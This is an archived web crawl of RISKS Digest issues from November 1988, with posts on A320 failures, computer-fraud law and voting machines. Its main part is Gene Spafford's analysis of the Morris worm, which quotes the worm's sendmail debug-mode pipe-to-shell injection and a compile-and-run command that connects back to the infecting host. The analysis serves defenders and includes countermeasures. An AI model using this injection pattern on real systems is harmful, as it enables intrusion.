show that if the computer is not secure (and like you, I don't believe there
ever will be such a beastie), there is simply no way to prevent a virus (or,
in this case, a worm) from getting into that system.
   I know this is somewhat sketchy, flabby, and fuzzy, but it's all I know
so far.  I'll keep you posted on developments ...

Matt

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
A320 update
</A>
</H3>
<address>
Steve Philipson 
&lt;<A HREF="mailto:steve@aurora.arc.nasa.gov">
steve@aurora.arc.nasa.gov
</A>&gt;
</address>
<i>
Mon, 31 Oct 88 11:39:11 PST
</i><PRE>

Henry Spencer's recent article on the A320's first six months in
service states that the fly-by-wire system has "behaved perfectly."
It should be noted, however, that the article he was referring
to clearly pointed out that there were failures of the primary 
flight guidance computer, which were rectified by backup systems.


More information from Flight:


 From Flight International, 9/24/88:

"Five months after entry into commercial service with Air France, British
Airways, and Air Inter, Airbus Industries' A320 fly-by-wire 150-seat
airliner still has many teething problems, but fewer than other Europ-
ean or American transport aircraft in their first year, say the man
ufacturers and operators [Note: Air France and BA have been running
rather old fleets for a LONG time]

"Air France's Airbus A320 Ville de Paris, on flight AF914 from Paris
to Amsterdam on August 26, had to turn back shortly after takeoff 
from Charles de Gaulle with 81 passengers on board.  A series
of warnings included a toilet fire indication, which subsequently
proved to be a false alarm.

"When the pilot attempted to land the aircraft, yet another warning
light erroneously indicated that the landing gear was not down.  The
A320 made a pass over the airport, and the control tower confirmed 
that the landing gear was down.  A second pass was then made, and
Air France ground engineers andmechanics confirmed that the gear
was down. The pilot made a perfect landing, although the computer
display system displayed many false warnings.

"Passengers on the A320, which had taken off 40 min. late because of
heavy traffic, had to transfer to two other aircraft, causing a 
4 hr delay.  

"The faulty A320 was grounded for two days pending thorough checks,
but is now back in regular service to Dusseldorf, Amsterdam, and
Geneva.

"Earlier, on August 19, an Airbus A320 belonging to French domestic
carrier Air Inter reported a double power failure on a flight from
Nice Cote d'Azur to Paris.  According to a computer system warning,
the auxilliar power unit broke down at the same time as one of the
two main generators, a little while before landing at Orly airport.
The pilot made a safe landing, as his aircraft still had three
additional power sources--the second main generors, batteries, and 
the other auxilliary power unit.

"On March 28, Air France's Ville de Paris had encountered similar pro-
blems on its inaugural flight over Paris and the Champs Elysees with
then Prime Minister Jacques Chirac and 150 other passengers.

"Since entry into commercial service, only three per cent of A320 flights
have been delayed beyond the accepted 15 min. by technical problems, says
Airbus Industrie technical vice-president Bernard Ziegler.  'This 97
per cent rate of technical regularity is very close to the best aircraft
in service, which have attained 98 per cent or 98.3 per cent,' he says.
"For a brand new aircraft with revolutionary avionics and fly-by-wire,
the A320 hasmade a remarkable achievement.'

The loss of Air France's third A320, Ville d'Amsterdam, at Mulhouse
Habsheim airport during a local aero club rally on June 26, with three
dead and 50 injured among its 153 joyriding passengers, has caused
great concern, although the aircraft has been cleared of any malfunc-
tion and the accident was  attributed to pilot error.  Air Inter's
pilots' union added to the general concern by striking in protest 
against the A320's two-man crew [but largely on the basis of pay and
seniority, with safety as a propaganda gimmick].

'Every day in Europe, five airliners on average turn back for various
technical reasons,' says Bernard Ziegler.  'That does not make news.
But when the A320 is one of the five, then the mass media cries out.
That's the rule of the game.  But we are satisfied the A320 is all
right--nothing wrong with it.  It's a very good plane.'

Any new aircraft undergoes a series of technical adjustments in its
first months of operation, he notes.  'It took Boeing two-and-
a-half years for the 757, a year for Airbus Industrie with the A300,
and hopefully it will only take us nine months for the A320,' says
Ziegler."

-----------
I find Ziegler's rationale for the failures of the A320 somewhat 
disturbing.  With only a handful of airplanes in service, for any
significant percentage of in-flight or on-ground failures to occur,
and then say it should be compared to the massive fleets of existing
aircraft, is to obfuscate the issue.

His confidence in the A320's backup electrical systems is also rather
odd, considering the airplane's susceptibility to transient controls,
and his company's failure to provide even a mediocre cabin lighting
control system.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: Conspiracy to Defraud 
</A>
</H3>
<address>
&lt;<A HREF="mailto:dan@WILMA.BBN.COM">
dan@WILMA.BBN.COM
</A>&gt;
</address>
<i>
Tue, 01 Nov 88 16:39:47 -0500
</i><PRE>

Re the Confederation of British Industry's proposal to change the law on
defrauding to include deception of computers as well as people:

To state the obvious, computer programs are so limited in their ability to
understand what someone might be trying to do, and what information is
necessary for that purpose, that it's often necessary to "deceive" them just to
get them to do the right thing.  It's much like the problem of figuring out
what to put on a complex form, like tax forms: every individual situation is
different, and the form either provides no way at all to say what your
situation is, or provides several equally plausible ways to express it.  But at
least forms have margins, and you can attach additional pieces of paper to
them.  Computer-based "forms" have neither.

Here's an example: in the process of trying to provide some service, a computer
asks for my telephone number.  I don't believe it has any right to that number
for this purpose, so I refuse to answer.  But it won't go on to the next query
until I answer that one.  I find someone in charge: "I don't want to give my
phone number out.  Is that OK?"  "Sure.  Just give it a fake number and go on."
The computer is now "deceived".  It's ridiculous to think that both I and the
computer's owner could now be charged with fraud!

Taken literally, such a law would also preclude thorough testing of computer
software.  In testing, you're almost always "deceiving" the computer in order
to see whether it will handle some case correctly, particularly if you're
checking error handling.  Are testers going to have to insert special routines
that print out "It's OK, I know this is a test" before giving any answers, to
avoid prosecution?

There are also serious theoretical problems with the notion of "deceiving" a
computer.  In theory, deception occurs when an individual is deliberately led
to believe X when not-X is true.  But what does "belief" mean when applied to a
computer system?  If I have a file on a computer system that says I'm 3 years
old, does that mean the computer "believes" I'm three years old?  Of course
not, you say.  What if it's in a database?  Is it deception then?

I think it's all the fault of some AI people who would like us to think that
all it takes to be able to say that a computer system believes a fact is that
it's in a Lisp-based inference system that includes a "believes" predicate!

	Dan Franklin

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Telephone answering machines
</A>
</H3>
<address>
Vince Manis
&lt;<A HREF="mailto:manis@grads.cs.ubc.ca ">
manis@grads.cs.ubc.ca 
</A>&gt;
</address>
<i>
Tue, 1 Nov 88 16:30:36 PST
</i><PRE>

I was concerned about security when I bought a new answering machine this
spring. I finally settled on a GE model which has an 8-bit security code (which
you set in octal!), believing that a search space of 256 is large enough.
(There--all you have to do is look me up in the phone book and you have enough
information to crack my code. Some people are just not security-conscious
enough.)

The search space seemed large enough on the following grounds:

1) there aren't many answering machine hackers around;

2) I rarely store confidential data on my machine;

3) people aren't patient enough to call a number 256 times just to break in.

Now, what I'm surprised at is that this is *exactly* the reasoning that those
operating computers have used, and I knew that at the time, having read lots of
papers on security. I hadn't even thought about only allowing non-destructive
operations, though again this is something that anybody who has ever used
anonymous ftp knows about immediately.

Am I overreacting, or is it really better to say that those who are cognisant
of history are also doomed to repeat it?

Vincent Manis, Manager, Instructional Laboratories, 
Department of Computer Science, University of British Columbia

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.68.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.70.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-22</DOCNO>
<DOCOLDNO>IA012-000131-B034-413</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.70.html 128.240.150.127 19970217023619 text/html 23296
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:34:45 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 70</TITLE>
<LINK REL="Prev" HREF="/Risks/7.69.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.71.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.69.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.71.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 70</H1>
<H2> Thursday 3 November 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Updated worm report 
</A>
<DD>
<A HREF="#subj1.1">
Gene Spafford
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  A worm "condom" 
</A>
<DD>
<A HREF="#subj2.1">
Gene Spafford
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  A cure!!!!! 
</A>
<DD>
<A HREF="#subj3.1">
Gene Spafford
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Computer Network Disrupted by `Virus' 
</A>
<DD>
<A HREF="#subj4.1">
John Markoff via Geoff Goodfellow
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  "Annals of Democracy -- Counting Votes" in the New Yorker 
</A>
<DD>
<A HREF="#subj5.1">
Daniel B Dobkin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Comments on the New Yorker article 
</A>
<DD>
<A HREF="#subj6.1">
PGN
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Updated worm report
</A>
</H3>
<address>
Gene Spafford 
&lt;<A HREF="mailto:spaf@purdue.edu">
spaf@purdue.edu
</A>&gt;
</address>
<i>
Fri, 04 Nov 88 00:27:54 EST
</i><PRE>
Organization: SERC, Department of Computer Sciences, Purdue Univ.

This is an updated description of how the worm works (note: it is 
technically a worm, not a virus, since it does not attach itself
to other code {that we know about}):

All of our Vaxen and some of our Suns here were infected with the worm.  The
worm forks repeated copies of itself as it tries to spread itself, and the load
averages on the infected machines skyrocketed.  In fact, it got to the point
that some of the machines ran out of swap space and kernel table entries,
preventing login to even see what was going on!

The worm seems to consist of two parts.  The way that it works is as
follows:

1) Virus running on an infected machine opens a TCP connection to a
victim machine's sendmail, invokes debug mode, and submits a version
of itself as a mail message.
*OR* it uses rsh to create itself on the remote machine through
an account requiring no password (due to hosts.equiv or .rhosts
entries).  *OR* it gets in via a bug in fingerd *OR* it uses telnet
(more on this later).

Using the sendmail route, it does something like:
From: /dev/null
To: "|sed -e 1,/^$/d | sh; exit 0"

cd /usr/tmp
cat &gt; x14481910.c &lt;&lt;'EOF'
&lt;text of program deleted?
EOF
cc -o x14481910 x14481910.c;x14481910 128.10.2.215 32341 8712440;rm -f x14481910 x14481910.c


2) This program is a simple "listener" or "helper" program of about a hundred
lines of fairly simple code.  As you can see, the helper is invoked with
arguments pointing back at the infecting worm (giving hostid/socket/checksum(?)
as arguments).

3) The helper then connects to the "server" and copies a number of files
(presumably to /tmp).  After the files are copied, it exec's a shell with
standard input coming from the infecting worm program on the other end of the
socket.

From here, I speculate on what happens since I can't find the source to
this part lying around on our machines:

4) The newly exec'd shell attempts to compile itself from the files copied over
to the target machine.  The command file it uses is as follows:

PATH=/bin:/usr/bin:/usr/ucb
rm -f sh
if [ -f sh ]
then
P=x%d
else
P=sh
cc -o $P %s
/bin/echo %s
./$P -p $$ 

5) This creates and dispatches the new worm..  This worm opens all the worm
source files, then unlinks the files so they can't be found (since it has them
open, however, it can still access the contents).  Next, the worm steps through
the hosts file (on the Sun, it uses YP to step through the distributed hosts
file) trying to connect to other machines' sendmail.  If a connection succeeds,
it forks a child process to infect it, while the parent continues to attempt
infection of other machines.

6) The child requests and initializes a new socket, then builds and invokes a
listener with the new socket number and hostid as arguments (#1, above).


Other notes:

The worm runs in stages.  It first collects info from the /etc/hosts files, the
hosts.equiv file, and other files containing host names and host IP addresses.
It even runs netstat to find out what networks the machine is attached to! It
uses this information to attempt to penetrate sendmail on those machines.  It
also knows how to penetrate "fingerd" on Vaxen (on Suns, the attempt results in
a core dump).  I will privately tell individuals how to fix the bug in fingerd,
but for now change it so it does not run as "root".

After this first stage, it appears to sleep for a while.  Then it starts
collecting user names and it begins probing with "rsh".  It also tries to
attack the passwords by trying a set of built-in words, the contents of
/usr/dict, and words snarfed from system files.  If it succeeds in breaking a
local password, it forks a child to use telnet to break into that account and
copy itself.

As I write this, no one seems to know what it is supposed to eventually do.
Perhaps it just breaks in everywhere it can.  We do know that if it doesn't
break into any accounts or systems for a while, it enters a mode where it tries
to break the root password via brute force searching.  We suspect that if it
succeeds it then does very nasty things.

Other notes:

The program corrupts its argument vector, so it appears in a "ps ax" as "(sh)"
(a login shell).  Don't trust any of these if you have them running.

The program doesn't copy around source files (except the helper) -- it copies
around pre-compiled binaries that are linked on the local machine and then run.
The worm appears to only be carrying binaries for 68020-based Suns and Vax 7xx
and 8800 machines.  Pyramids, Sun 2's and Sequents are all definitely immune.
(Note: an infected 8800 is an awesome engine of contagion.)

The strings in the binaries are encrypted against a random "strings"
invocation.  If you have a binary, Keith Bostic informs me that Xor with 0x81
will reveal interesting things, although that is not the only mask used.

The first observation of the virus I have heard about was 6pm Wednesday night
in Pittsburgh.  It didn't hit Purdue until about 4 this morning.  We were lucky
in that other sites, like CMU and Princeton, were hit around 11 last night.


Acknowledgements:  Some of the above information was obtained from
Brian Kantor (UCSD), Keith Bostic (UCB), Thomas Narten (Purdue), Dan
Trinkle (Purdue), Kevin Braunsdorf (Purdue) and Miek Rowan (Purdue).
Thanks, guys.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
A worm "condom" 
</A>
</H3>
<address>
Gene Spafford 
&lt;<A HREF="mailto:spaf@purdue.edu">
spaf@purdue.edu
</A>&gt;
</address>
<i>
Thu, 03 Nov 88 21:20:10 EST
</i><PRE>
Organization: SERC, Department of Computer Sciences, Purdue Univ.

... Kevin Braunsdorf &amp; Rich Kulawiec (Purdue-CC) have come up with a "condom"
to protect your machine against the CURRENT worm.  They are not 100% sure it
works, but it seems to be completely effective and it can't do any harm.  As
ROOT, do:

mkdir /usr/tmp/sh
chmod 111 /usr/tmp/sh

Then edit your rc.local file to recreate the directory in case of a reboot.
This will not stop a current infection, but it will prevent any new ones
from taking hold -- it prevents the worm from creating replicas.

... --spaf

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
A cure!!!!!
</A>
</H3>
<address>
Gene Spafford 
&lt;<A HREF="mailto:spaf@purdue.edu">
spaf@purdue.edu
</A>&gt;
</address>
<i>
Thu, 03 Nov 88 22:04:15 EST
</i><PRE>
Organization: SERC, Department of Computer Sciences, Purdue Univ.

FLASH!!

Kevin ("Adb's your friend.") Braunsdorf just burst into my office
with a cure discovered in the disassembled worm binary.

If there is an external variable in the library named "pleasequit" that is
non-zero, the worm will die immediately after exiting.  Thus, to kill any new
worms, include a patch in your library that defines the symbol.  The following
shell file and source code will modify your C library to define this symbol.

It WON'T kill any currently linked and running versions, but it will
prevent reinfection.


# Shar archive.  Give the following as input to /bin/sh
#  Packed Thu Nov  3 21:56:35 EST 1988 by spaf@uther.cs.purdue.edu
#
#  This archive contains:
#	foo.sh
#	foo.c
#
#
echo x - foo.sh
sed 's/^X//' &gt;foo.sh &lt;&lt;'*-*-END-of-foo.sh-*-*'
Xcc -c foo.c -o foo.o
Xcp /lib/libc.a /lib/libc.a.old
Xar q /lib/libc.a foo.o
Xranlib /lib/libc.a
*-*-END-of-foo.sh-*-*
echo x - foo.c
sed 's/^X//' &gt;foo.c &lt;&lt;'*-*-END-of-foo.c-*-*'
Xextern int pleasequit = -1;
*-*-END-of-foo.c-*-*
exit

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Computer Network Disrupted by `Virus'
</A>
</H3>
<address>
the tty of Geoff Goodfellow
&lt;<A HREF="mailto:geoff@fernwood.mpk.ca.us ">
geoff@fernwood.mpk.ca.us 
</A>&gt;
</address>
<i>
Thu, 3 Nov 88 21:30:19 PST
</i><PRE>

COMPUTER NETWORK DISRUPTED BY `VIRUS'
By JOHN MARKOFF=
c.1988 N.Y. Times News Service=

	   In an intrusion that raises new questions about the
vulnerability of the nation's computers, a nationwide Department of
Defense data network has been disrupted since Wednesday night by a
rapidly spreading ``virus'' software program apparently introduced
by a computer science student's malicious experiment.
	   The program reproduced itself through the computer network,
making hundreds of copies in each machine it reached, effectively
clogging systems linking thousands of military, corporate and
university computers around the country and preventing them from
doing additional work. The virus is thought not to have destroyed
any files.
	   By late Thursday afternoon computer security experts were
calling the virus the largest assault ever on the nation's
computers.
	   ``The big issue is that a relatively benign software program can
virtually bring our computing community to its knees and keep it
there for some time,'' said Chuck Cole, deputy computer security
manager at Lawerence Livermore Laboratory in Livermore, Calif., one
of the sites affected by the intrusion. ``The cost is going to be
staggering.''
	   Clifford Stoll,^ @a computer security expert at Harvard
University, added: ``There is not one system manager who is not
tearing his hair out. It's causing enormous headaches.''
	   The affected computers carry routine communications among
military officials, researchers and corporations.
	   While some sensitive military data are involved, the nation's
most sensitive secret information, such as that on the control of
nuclear weapons, is thought not to have been touched by the virus.
	   Computer viruses are so named because they parallel in the
computer world the behavior of biological viruses. A virus is a
program, or a set of instructions to a computer, that is
deliberately planted on a floppy disk meant to be used with the
computer or introduced when the computer is communicating over
telephone lines or data networks with other computers.
	   The programs can copy themselves into the computer's master
software, or operating system, usually without calling any
attention to themselves. From there, the program can be passed to
additional computers.
	   Depending upon the intent of the software's creator, the program
might cause a provocative but otherwise harmless message to appear
on the computer's screen. Or it could systematically destroy data
in the computer's memory.
	   The virus program was apparently the result of an experiment by
a computer science graduate student trying to sneak what he thought
was a harmless virus into the Arpanet computer network, which is
used by universities, military contractors and the Pentagon, where
the software program would remain undetected.
	 A man who said he was an associate of the student said in a telephone
call to The New York Times that the experiment went awry because of a small
programming mistake that caused the virus to multiply around the military
network hundreds of times faster than had been planned.
	   The caller, who refused to identify himself or the programmer,
said the student realized his error shortly after letting the
program loose and that he was now terrified of the consequences.
	   A spokesman at the Pentagon's Defense Communications Agency,
which has set up an emergency center to deal with the problem, said
the caller's story was a ``plausible explanation of the events.''
	   As the virus spread Wednesday night, computer experts began a
huge struggle to eradicate the invader.
	   A spokesman for the Defense Communications Agency in Washington
acknowledged the attack, saying, ``A virus has been identified in
several host computers attached to the Arpanet and the unclassified
portion of the defense data network known as the Milnet.''
	   He said that corrections to the security flaws exploited by the
virus are now being developed.
	   The Arpanet data communications network was established in 1969
and is designed to permit computer researchers to share electronic
messages, programs and data such as project information, budget
projections and research results.
	   In 1983 the network was split and the second network, called
Milnet, was reserved for higher-security military communications.
But Milnet is thought not to handle the most classified military
information, including data related to the control of nuclear
weapons.
	   The Arpanet and Milnet networks are connected to hundreds of
civilian networks that link computers around the globe.
	   There were reports of the virus at hundreds of locations on both
coasts, including, on the East Coast, computers at the
Massachusetts Institute of Technology, Harvard University, the
Naval Research Laboratory in Maryland and the University of
Maryland and, on the West Coast, NASA's Ames Research Center in
Mountain View, Calif.; Lawrence Livermore Laboratories; Stanford
University; SRI International in Menlo Park, Calif.; the University
of California's Berkeley and San Diego campuses and the Naval Ocean
Systems Command in San Diego.
	   A spokesman at the Naval Ocean Systems Command said that its
computer systems had been attacked Wednesday evening and that the
virus had disabled many of the systems by overloading them. He said
that computer programs at the facility were still working on the
problem more than 19 hours after the original incident.
	   The unidentified caller said the Arpanet virus was intended
simply to ``live'' secretly in the Arpanet network by slowly
copying itself from computer to computer. However, because the
designer did not completely understand how the network worked, it
quickly copied itself thousands of times from machine to machine.
	 Computer experts who disassembled the program said that it was written
with remarkable skill and that it exploited three security flaws in the Arpanet
network.  [No. Actually UNIX] The virus' design included a program designed to
steal passwords, then masquerade as a legitimate user to copy itself to a
remote machine.
	   Computer security experts said that the episode illustrated the
vulnerability of computer systems and that incidents like this
could be expected to happen repeatedly if awareness about computer
security risks was not heightened.
	   ``This was an accident waiting to happen; we deserved it,'' said
Geoffrey Goodfellow,''(*) president of Anterior Technology Inc. and an
expert on computer communications.
	   ``We needed something like this to bring us to our senses. We
have not been paying much attention to protecting ourselves.''
	   Peter Neumann, a computer security expert at SRI International
Inc. in Menlo Park International, said: ``Thus far the disasters we
have known have been relatively minor. The potential for rather
extraordinary destruction is rather substantial.
	 ``In most of the cases we know of, the damage has been immediately
evident. But if you contemplate the effects of hidden programs, you could
have attacks going on and you might never know it.''

  [* Following is Geoff's full quote ("exploitation"), which John only
  partially integrated with Geoff's earlier off-the-cuff comment ("accident"):

    "This was an exploitation wanting to happen.  We deserved it.  We needed
    something like this to bring us to our senses.  We have not been paying
    much attention to protecting ourselves.  The blame does not rest on the R&amp;D
    community as a whole.  Look how many manufacturers [...] just took the
    original computer-science-department developed code willy-nilly, put their
    wrapper and corporate logo on it, and resold it to customers.  That's the
    real travesty here, we build these systems, OK, that's great, but we rarely
    build them and then ask how they might be abused, broken, or circumvented"
    {and then try to break them}.   ]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
"Annals of Democracy -- Counting Votes" in the New Yorker
</A>
</H3>
<address>
Daniel B Dobkin 
&lt;<A HREF="mailto:DAN%Irving@VX1.GBA.NYU.EDU">
DAN%Irving@VX1.GBA.NYU.EDU
</A>&gt;
</address>
<i>
Thu 3 Nov 88 11:18:09-EDT
</i><PRE>

The current (7 November 88) issue of The New Yorker contains an article by
Ronnie Dugger on "Counting Votes" -- the spreading use of computerized vote
tabulation in jurisdictions around the country.  It confirms what we all know,
or should know: the unprecedented potential for fraud, let alone the very real
possibilities for "computer error", make this a giant step backwards for
democracy and universal suffrage.

A number of the "experts" interviewed admitted that the potential for fraud --
or outright stealing the election -- exists, but brushed it off with a
perfunctory, "I don't know of any cases yet where that has happened."  To my
mind, that is exactly the point: the fact that you don't know about it can just
as easily be cited to indicate that it HAS happened; after all, you aren't
SUPPOSED to know about it.

Other highlights of the article include interviews with Michael Shamos,
formerly of UniLogic (now Scribe Systems); and Peter Neumann, of SRI
International, the moderator of the RISKS digest.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Comments on the New Yorker article
</A>
</H3>
<address>
Peter Neumann 
&lt;<A HREF="mailto:neumann@kl.sri.com">
neumann@kl.sri.com
</A>&gt;
</address>
<i>
Thu, 3 Nov 1988 22:18:11 PDT
</i><PRE>

For the record, in Ronnie Dugger's interview with me, we discussed at length
(1) the potential risks of using today's conventional computer system
technology in elections, and (2) what one might do to try to develop a system
that would avoid many of those risks -- although admittedly it could not be
perfect.  I presume that Howard Strauss (who is also quoted, and whose report
"Ensuring the Integrity of Electronic Elections" with Jon Edwards outlines what
they consider to be necessary procedural controls) also stressed his published
recommendations.  Apparently Dugger chose to emphasize the risks, and downplay
discussion of constructive design techniques and operational procedures.  He
does note that New York City is currently engaged in the competitive
procurement and development of a new system, but does not indicate that the
specified requirements (e.g., complete enchipment, no software [and
consequently no software modification], privacy, integrity, separation of
duties, extensive redundancy and cross-checking, reproducibility of results,
physical and electronic isolation, procedural controls, ...) are vastly more
stringent that anything that exists today.  So, perhaps the prospects for the
future are substantially more optimistic than he has portrayed.

Incidentally, "A Special Report on Computing and Elections", 11 pp., a joint
publication from ELECTION WATCH, a project of the Urban Policy Research
Institute, and from the CPSR/Portland Computer Voting Project, Computer
Professionals for Social Responsibility, is available from either CPSR, PO Box
717, Palo Alto CA 94301, 415-322-3778, or UPRI, 530 Paseo Miramar, Pacific
Palisades CA 90272, 213-459-4982.  In addition, papers by Wilcox and Nilsson
and by Strauss and Edwards are available for $5 (for both) from CPSR.  The full
report by Strauss and Edwards is available from Howard Strauss, 116 Prospect
Ave., Princeton NJ 08544 for $8.  Costs are for copying, handling, and postage
only.  [I have previously noted reports by Roy G. Saltman and by Lance J.
Hoffman in <A HREF="/Risks/7.52.html">RISKS-7.52</A>.]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.69.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.71.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-23</DOCNO>
<DOCOLDNO>IA012-000131-B035-11</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.71.html 128.240.150.127 19970217023632 text/html 25613
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:35:01 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 71</TITLE>
<LINK REL="Prev" HREF="/Risks/7.70.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.72.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.70.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.72.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 71</H1>
<H2> Sunday 6 November 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Send us your Arpanet Virus War Stories 
</A>
<DD>
<A HREF="#subj1.1">
Cliff Stoll
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Suspect in Virus Case 
</A>
<DD>
<A HREF="#subj2.1">
Brian M. Clapper
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Internet Virus 
</A>
<DD>
<A HREF="#subj3.1">
Mark W. Eichin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  RISKS of getting opinions from semi-biased sources 
</A>
